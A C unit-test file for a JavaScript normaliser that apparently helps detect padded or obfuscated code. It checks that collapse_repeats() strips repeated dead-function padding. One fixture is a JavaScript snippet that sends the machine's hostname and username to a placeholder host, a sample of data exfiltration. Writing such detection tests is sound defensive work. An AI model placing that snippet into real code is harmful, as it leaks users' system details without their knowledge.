#include "normalise.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int failures;

/* Prints one PASS or FAIL line and counts a failure. */
static void check(const char *name, int ok)
{
    printf("%s %s\n", ok ? "PASS" : "FAIL", name);
    if (!ok)
        failures++;
}

/* Returns the malloc'd, collapsed normalised form of text and stores its length in *len. */
static unsigned char *collapsed(const char *text, size_t *len)
{
    unsigned char *norm = normalise_js((const unsigned char *)text, strlen(text), 0, len);
    if (norm != NULL)
        *len = collapse_repeats(norm, *len);
    return norm;
}

/* Returns 1 when a and b collapse to the same bytes, otherwise 0. */
static int same(const char *a, const char *b)
{
    size_t alen, blen;
    unsigned char *an = collapsed(a, &alen);
    unsigned char *bn = collapsed(b, &blen);
    int equal = an != NULL && bn != NULL && alen == blen && memcmp(an, bn, alen) == 0;
    free(an);
    free(bn);
    return equal;
}

/* Returns a malloc'd copy of code with count dead functions before and after it. */
static char *padded(const char *code, int count)
{
    size_t cap = strlen(code) + (size_t)count * 2 * 64 + 64;
    char *out = malloc(cap);
    size_t n = 0;
    for (int side = 0; side < 2; side++) {
        for (int i = 0; i < count; i++)
            n += (size_t)snprintf(out + n, cap - n, "function _pad_%d(){var x=%d;return x;}\n", i, i);
        if (side == 0)
            n += (size_t)snprintf(out + n, cap - n, "%s\n", code);
    }
    return out;
}

/* Checks collapse_repeats() on padded, unpadded and repetitive inputs. */
int main(void)
{
    const char *code =
        "const os = require('os');\n"
        "function send(data) { require('https').get('https://example.invalid/?d=' + data); }\n"
        "send(os.hostname() + os.userInfo().username);\n";
    char *pad = padded(code, 320);
    check("dead-code padding collapses to the original normalised code", same(code, pad));
    free(pad);

    char *few = padded(code, 1);
    check("a block seen only twice is kept", !same(code, few));
    free(few);

    const char *once = "function a(x) { if (x) { return 1; } return 2; }\n";
    size_t len;
    unsigned char *n1 = normalise_js((const unsigned char *)once, strlen(once), 0, &len);
    size_t before = len;
    len = collapse_repeats(n1, len);
    check("code without repeats is unchanged", len == before);
    free(n1);

    const char *all = "function f(){return 1}\nfunction g(){return 2}\nfunction h(){return 3}\n";
    unsigned char *n2 = normalise_js((const unsigned char *)all, strlen(all), 0, &len);
    before = len;
    len = collapse_repeats(n2, len);
    check("a stream made only of repeats is left unchanged", len == before);
    free(n2);

    unsigned char empty[1] = {0};
    check("an empty stream stays empty", collapse_repeats(empty, 0) == 0);

    printf("%d failure(s)\n", failures);
    return failures ? 1 : 0;
}
